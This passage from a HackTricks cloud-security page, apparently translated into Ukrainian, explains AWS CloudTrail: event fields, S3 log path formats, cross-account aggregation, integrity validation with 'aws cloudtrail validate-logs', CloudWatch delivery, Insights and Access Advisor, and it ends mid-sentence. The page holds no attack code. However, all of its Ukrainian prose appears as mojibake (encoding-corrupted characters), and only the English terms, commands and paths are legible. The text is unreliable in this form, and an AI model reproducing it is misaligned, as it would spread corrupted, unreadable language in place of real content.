# AWS - CloudTrail Enum

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫—ñ–Ω–≥-—Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## **CloudTrail**

AWS CloudTrail **–∑–∞–ø–∏—Å—É—î —Ç–∞ –≤—ñ–¥—Å—Ç–µ–∂—É—î –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å —É –≤–∞—à–æ–º—É AWS —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ**. –í—ñ–Ω –∑–∞—Ö–æ–ø–ª—é—î –¥–µ—Ç–∞–ª—å–Ω—ñ **–∂—É—Ä–Ω–∞–ª–∏ –ø–æ–¥—ñ–π**, –≤–∫–ª—é—á–∞—é—á–∏ —Ö—Ç–æ, —â–æ, –∫–æ–ª–∏ —Ç–∞ –∑–≤—ñ–¥–∫–∏, –¥–ª—è –≤—Å—ñ—Ö –≤–∑–∞—î–º–æ–¥—ñ–π –∑ —Ä–µ—Å—É—Ä—Å–∞–º–∏ AWS. –¶–µ –∑–∞–±–µ–∑–ø–µ—á—É—î —Å–ª—ñ–¥ –¥—ñ–π –∑–º—ñ–Ω —Ç–∞ –¥—ñ–π, –¥–æ–ø–æ–º–∞–≥–∞—î –≤ –∞–Ω–∞–ª—ñ–∑—ñ –±–µ–∑–ø–µ–∫–∏, –∞—É–¥–∏—Ç—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ —Ç–∞ –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—ñ –∑–º—ñ–Ω —Ä–µ—Å—É—Ä—Å—ñ–≤. CloudTrail —î –≤–∞–∂–ª–∏–≤–∏–º –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ —Ä–µ—Å—É—Ä—Å—ñ–≤, –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ –∑ –ø—Ä–∞–≤–∏–ª–∞–º–∏.

–ö–æ–∂–Ω–∞ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∞ –ø–æ–¥—ñ—è –º—ñ—Å—Ç–∏—Ç—å:

* –ù–∞–∑–≤–∞ –≤–∏–∫–ª–∏–∫–∞–Ω–æ–≥–æ API: `eventName`
* –í–∏–∫–ª–∏–∫–∞–Ω–∏–π —Å–µ—Ä–≤—ñ—Å: `eventSource`
* –ß–∞—Å: `eventTime`
* IP-–∞–¥—Ä–µ—Å–∞: `SourceIPAddress`
* –ú–µ—Ç–æ–¥ –∞–≥–µ–Ω—Ç–∞: `userAgent`. –ü—Ä–∏–∫–ª–∞–¥–∏:
* Signing.amazonaws.com - –ó –∫–æ–Ω—Å–æ–ª—ñ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è AWS
* console.amazonaws.com - –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –∫–æ—Ä–µ–Ω–µ–≤–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É
* lambda.amazonaws.com - AWS Lambda
* –ü–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø–∏—Ç—É: `requestParameters`
* –ï–ª–µ–º–µ–Ω—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ: `responseElements`

–ü–æ–¥—ñ—ó –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è –≤ –Ω–æ–≤–∏–π —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É **–ø—Ä–∏–±–ª–∏–∑–Ω–æ –∫–æ–∂–Ω—ñ 5 —Ö–≤–∏–ª–∏–Ω —É —Ñ–∞–π–ª JSON**, –≤–æ–Ω–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è CloudTrail, –∞ –≤ –∫—ñ–Ω—Ü–µ–≤–æ–º—É –ø—ñ–¥—Å—É–º–∫—É —Ñ–∞–π–ª–∏ –∂—É—Ä–Ω–∞–ª—ñ–≤ **–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç—å—Å—è –≤ S3 –ø—Ä–∏–±–ª–∏–∑–Ω–æ —á–µ—Ä–µ–∑ 15 —Ö–≤–∏–ª–∏–Ω**.\
–ñ—É—Ä–Ω–∞–ª–∏ CloudTrail –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∞–≥—Ä–µ–≥–æ–≤–∞–Ω—ñ –º—ñ–∂ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ —Ç–∞ —Ä–µ–≥—ñ–æ–Ω–∞–º–∏**.\
CloudTrail –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Ü—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—å —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—É, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ –≤–∞—à—ñ —Ñ–∞–π–ª–∏ –∂—É—Ä–Ω–∞–ª—É –∑–∞–ª–∏—à–∏–ª–∏—Å—è –Ω–µ–∑–º—ñ–Ω–Ω–∏–º–∏** –∑ –º–æ–º–µ–Ω—Ç—É —ó—Ö–Ω—å–æ—ó –¥–æ—Å—Ç–∞–≤–∫–∏ CloudTrail –≤–∞–º. –í—ñ–Ω —Å—Ç–≤–æ—Ä—é—î —Ö–µ—à SHA-256 –∂—É—Ä–Ω–∞–ª—ñ–≤ —É —Ñ–∞–π–ª—ñ –¥–∞–π–¥–∂–µ—Å—Ç—É. –•–µ—à sha-256 –Ω–æ–≤–∏—Ö –∂—É—Ä–Ω–∞–ª—ñ–≤ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —â–æ–≥–æ–¥–∏–Ω–∏.\
–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –¢—Ä–∞—Å–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä–∏ –ø–æ–¥—ñ–π –¥–æ–∑–≤–æ–ª—è—Ç—å –≤–∫–∞–∑–∞—Ç–∏ —Ç—Ä–∞—Å—É –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó: –ø–æ–¥—ñ—ó —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è, –¥–∞–Ω–∏—Ö –∞–±–æ —ñ–Ω—Å–∞–π—Ç—ñ–≤.

–ñ—É—Ä–Ω–∞–ª–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Å—Ö–æ–≤–∏—â—ñ S3. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ (SSE-S3), —Ç–æ–º—É AWS —Ä–æ–∑—à–∏—Ñ—Ä—É—î –≤–º—ñ—Å—Ç –¥–ª—è –ª—é–¥–µ–π, —è–∫—ñ –º–∞—é—Ç—å –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø, –∞–ª–µ –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó –±–µ–∑–ø–µ–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ SSE –∑ KMS —Ç–∞ —Å–≤–æ—ó–º–∏ –∫–ª—é—á–∞–º–∏.

–ñ—É—Ä–Ω–∞–ª–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ **—Å—Ö–æ–≤–∏—â—ñ S3 –∑ —Ç–∞–∫–∏–º —Ñ–æ—Ä–º–∞—Ç–æ–º —ñ–º–µ–Ω—ñ**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* –î–µ BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* –ü—Ä–∏–∫–ª–∞–¥: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

–£ –∫–æ–∂–Ω—ñ–π –ø–∞–ø—Ü—ñ –∫–æ–∂–µ–Ω –∂—É—Ä–Ω–∞–ª –º–∞—Ç–∏–º–µ **—ñ–º'—è –∑–∞ —Ç–∞–∫–∏–º —Ñ–æ—Ä–º–∞—Ç–æ–º**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

–ö–æ–Ω–≤–µ–Ω—Ü—ñ—è –Ω–∞–π–º–µ–Ω—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—É

![](<../../../../.gitbook/assets/image (29).png>)

–ö—Ä—ñ–º —Ç–æ–≥–æ, **—Ñ–∞–π–ª–∏ –¥–∞–π–¥–∂–µ—Å—Ç—É (–¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤)** –±—É–¥—É—Ç—å –≤ —Ç–æ–º—É **—Å–∞–º–æ–º—É —Å—Ö–æ–≤–∏—â—ñ** –≤:

![](<../../../../.gitbook/assets/image (22).png>)

### –ê–≥—Ä–µ–≥—É–≤–∞–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –∑ –∫—ñ–ª—å–∫–æ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤

* –°—Ç–≤–æ—Ä—ñ—Ç—å –¢—Ä–∞—Å—É –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS, –∫—É–¥–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ, —â–æ–± —Ñ–∞–π–ª–∏ –∂—É—Ä–Ω–∞–ª—É –±—É–ª–∏ –¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ñ
* –ó–∞—Å—Ç–æ—Å—É–π—Ç–µ –¥–æ–∑–≤–æ–ª–∏ –¥–æ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ —Å—Ö–æ–≤–∏—â–∞ S3, —â–æ –¥–æ–∑–≤–æ–ª—è—î –¥–æ—Å—Ç—É–ø –º—ñ–∂ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ –¥–ª—è CloudTrail —Ç–∞ –¥–æ–∑–≤–æ–ª—å—Ç–µ –¥–æ—Å—Ç—É–ø –∫–æ–∂–Ω—ñ–π –æ–±–ª—ñ–∫–æ–≤—ñ–π –∑–∞–ø–∏—Å—ñ AWS, —è–∫–∞ –ø–æ—Ç—Ä–µ–±—É—î –¥–æ—Å—Ç—É–ø—É
* –°—Ç–≤–æ—Ä—ñ—Ç—å –Ω–æ–≤—É –¢—Ä–∞—Å—É –≤ —ñ–Ω—à–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å–∞—Ö AWS —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ —Å—Ö–æ–≤–∏—â–∞ —É –∫—Ä–æ—Ü—ñ 1

–û–¥–Ω–∞–∫, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–±–µ—Ä–µ–≥—Ç–∏ –≤—Å—ñ –∂—É—Ä–Ω–∞–ª–∏ –≤ –æ–¥–Ω–æ–º—É —Å—Ö–æ–≤–∏—â—ñ S3, –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∞–≥—Ä–µ–≥—É–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ CloudTrail –∑ –∫—ñ–ª—å–∫–æ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –≤ –∂—É—Ä–Ω–∞–ª–∏ CloudWatch, —â–æ –Ω–∞–ª–µ–∂–∞—Ç—å –¥–æ –æ–¥–Ω—ñ—î—ó —î–¥–∏–Ω–æ—ó –æ–±–ª—ñ–∫–æ–≤–æ—ó –∑–∞–ø–∏—Å—É AWS.

{% hint style="danger" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–æ–∂–µ –º–∞—Ç–∏ **—Ä—ñ–∑–Ω—ñ –¢—Ä–∞—Å–∏** –≤—ñ–¥ CloudTrail **—É–≤—ñ–º–∫–Ω–µ–Ω—ñ**, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å —Ç—ñ –∂ —Å–∞–º—ñ (–∞–±–æ —Ä—ñ–∑–Ω—ñ) –∂—É—Ä–Ω–∞–ª–∏ –≤ —Ä—ñ–∑–Ω–∏—Ö —Å—Ö–æ–≤–∏—â–∞—Ö.
{% endhint %}

### Cloudtrail –∑ —É—Å—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –≤ 1

–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ CloudTrail –º–æ–∂–Ω–∞ –≤–∫–∞–∑–∞—Ç–∏, —â–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ cloudtrail –¥–ª—è –≤—Å—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ –ª–∏—à–µ –≤ 1 —Å—Ö–æ–≤–∏—â—ñ:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –º–æ–∂–µ—Ç–µ –ª–µ–≥–∫–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ CloudTrail —É –≤—Å—ñ—Ö —Ä–µ–≥—ñ–æ–Ω–∞—Ö –≤—Å—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Ç–∞ —Ü–µ–Ω—Ç—Ä–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ –≤ 1 –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ (—è–∫–∏–π –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–∞—Ö–∏—â–∞—Ç–∏).

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—É

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ –∂—É—Ä–Ω–∞–ª–∏ –Ω–µ –±—É–ª–∏ –∑–º—ñ–Ω–µ–Ω—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### –õ–æ–≥–∏ –≤ CloudWatch

**CloudTrail –º–æ–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ª–æ–≥–∏ –≤ CloudWatch, —â–æ–± –≤–∏ –º–æ–≥–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è, —è–∫—ñ –ø–æ–ø–µ—Ä–µ–¥–∂–∞—é—Ç—å –≤–∞—Å, –∫–æ–ª–∏ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –ø—ñ–¥–æ–∑—Ä—ñ–ª—ñ –¥—ñ—ó.**\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –¥–æ–∑–≤–æ–ª–∏—Ç–∏ CloudTrail –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ª–æ–≥–∏ –≤ CloudWatch, –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Ä–æ–ª—å**, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î —Ü—é –¥—ñ—é. –Ø–∫—â–æ —Ü–µ –º–æ–∂–ª–∏–≤–æ, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–ª—å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º AWS –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü–∏—Ö –¥—ñ–π. –¶—è —Ä–æ–ª—å –¥–æ–∑–≤–æ–ª–∏—Ç—å CloudTrail:

* CreateLogStream: –¶–µ –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –ø–æ—Ç–æ–∫–∏ –∂—É—Ä–Ω–∞–ª—ñ–≤ CloudWatch Logs
* PutLogEvents: –ü–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –ª–æ–≥–∏ CloudTrail –≤ –ø–æ—Ç—ñ–∫ –∂—É—Ä–Ω–∞–ª—ñ–≤ CloudWatch Logs

### –Ü—Å—Ç–æ—Ä—ñ—è –ø–æ–¥—ñ–π

–Ü—Å—Ç–æ—Ä—ñ—è –ø–æ–¥—ñ–π CloudTrail –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ –≤ —Ç–∞–±–ª–∏—Ü—ñ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω—ñ –ª–æ–≥–∏:

![](<../../../../.gitbook/assets/image (24).png>)

### –í–∏—Å–Ω–æ–≤–∫–∏

**CloudTrail Insights** –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ **–∞–Ω–∞–ª—ñ–∑—É—î** –ø–æ–¥—ñ—ó —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∑–∞–ø–∏—Å–∞–º–∏ –∑ —Ç—Ä–∞—Å CloudTrail —Ç–∞ **–ø–æ–ø–µ—Ä–µ–¥–∂–∞—î** –≤–∞—Å –ø—Ä–æ **–Ω–µ–∑–≤–∏—á–∞–π–Ω—É –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø–æ–¥—ñ–π `TerminateInstance` –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö –±–∞–∑–æ–≤–∏—Ö –∑–Ω–∞—á–µ–Ω—å, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ —Ü–µ —è–∫ –ø–æ–¥—ñ—é Insight. –¶—ñ –ø–æ–¥—ñ—ó —Ä–æ–±–ª—è—Ç—å **–ø–æ—à—É–∫ —Ç–∞ —Ä–µ–∞–≥—É–≤–∞–Ω–Ω—è –Ω–∞ –Ω–µ–∑–≤–∏—á–∞–π–Ω—É API-–∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –ª–µ–≥—à–∏–º–∏**, –Ω—ñ–∂ –∫–æ–ª–∏-–Ω–µ–±—É–¥—å.

–í–∏—Å–Ω–æ–≤–∫–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Ç–æ–º—É –∂ –≤—ñ–¥—Ä–∞—Ö, —â–æ —ñ –ª–æ–≥–∏ CloudTrail –≤: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### –ë–µ–∑–ø–µ–∫–∞

| –¶—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—å —Ñ–∞–π–ª—É –∂—É—Ä–Ω–∞–ª—É CloudTrail | <ul><li>–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –ª–æ–≥–∏ –±—É–ª–∏ –ø—ñ–¥–º—ñ–Ω–µ–Ω—ñ (–∑–º—ñ–Ω–µ–Ω—ñ –∞–±–æ –≤–∏–¥–∞–ª–µ–Ω—ñ)</li><li><p>–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ–∞–π–ª digest (—Å—Ç–≤–æ—Ä—é—î —Ö–µ—à –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ —Ñ–∞–π–ª—É)</p><ul><li>–•–µ—à—É–≤–∞–Ω–Ω—è SHA-256</li><li>SHA-256 –∑ RSA –¥–ª—è —Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É</li><li>–ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –Ω–∞–ª–µ–∂–∏—Ç—å Amazon</li></ul></li><li>–ü–æ—Ç—Ä—ñ–±–Ω–æ 1 –≥–æ–¥–∏–Ω—É –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É digest (–≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —â–æ–≥–æ–¥–∏–Ω–∏)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| –ó—É–ø–∏–Ω–∏—Ç–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø      | <ul><li><p>–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –ø–æ–ª—ñ—Ç–∏–∫–∏ IAM —Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏ –≤—ñ–¥—Ä–∞ S3</p><ul><li>–∫–æ–º–∞–Ω–¥–∞ –∑ –±–µ–∑–ø–µ–∫–∏ ‚Äî> –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø</li><li>–∞—É–¥–∏—Ç–æ—Ä–∏ ‚Äî> —Ç—ñ–ª—å–∫–∏ —á–∏—Ç–∞–Ω–Ω—è</li></ul></li><li>–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ SSE-S3/SSE-KMS –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –ª–æ–≥—ñ–≤</li></ul>                                                                                                                                        |
| –ó–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏–¥–∞–ª–µ–Ω–Ω—é —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—É   | <ul><li>–û–±–º–µ–∂—Ç–µ –¥–æ—Å—Ç—É–ø –¥–æ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ–ª—ñ—Ç–∏–∫ IAM —Ç–∞ –≤—ñ–¥—Ä–∞</li><li>–ù–∞–ª–∞—à—Ç—É–π—Ç–µ –≤–∏–¥–∞–ª–µ–Ω–Ω—è S3 MFA</li><li>–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—É –∂—É—Ä–Ω–∞–ª—É</li></ul>                                                                                                                                                                                            |

## –ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –∑ –¥–æ—Å—Ç—É–ø—É

–ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –∑ –¥–æ—Å—Ç—É–ø—É AWS “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ –æ—Å—Ç–∞–Ω–Ω—ñ—Ö 400 –¥–Ω—è—Ö –ª–æ–≥—ñ–≤ **CloudTrail AWS –¥–ª—è –∑–±–æ—Ä—É —Å–≤–æ—ó—Ö –≤–∏—Å–Ω–æ–≤–∫—ñ–≤**. CloudTrail –∑–∞—Ñ—ñ–∫—Å–æ–≤—É—î —ñ—Å—Ç–æ—Ä—ñ—é –≤–∏–∫–ª–∏–∫—ñ–≤ API AWS —Ç–∞ –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –ø–æ–¥—ñ–π, –∑–¥—ñ–π—Å–Ω–µ–Ω–∏—Ö –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS. –ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –∑ –¥–æ—Å—Ç—É–ø—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü—ñ –¥–∞–Ω—ñ, —â–æ–± **–ø–æ–∫–∞–∑–∞—Ç–∏, –∫–æ–ª–∏ –≤–æ—Å—Ç–∞–Ω–Ω—î –±—É–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –ø–æ—Å–ª—É–≥–∏**. –ê–Ω–∞–ª—ñ–∑—É—é—á–∏ –ª–æ–≥–∏ CloudTrail, –∫–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –∑ –¥–æ—Å—Ç—É–ø—É –º–æ–∂–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —è–∫—ñ –ø–æ—Å–ª—É–≥–∏ AWS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á IAM –∞–±–æ —Ä–æ–ª—å —Ç–∞ –∫–æ–ª–∏ —Ü–µ–π 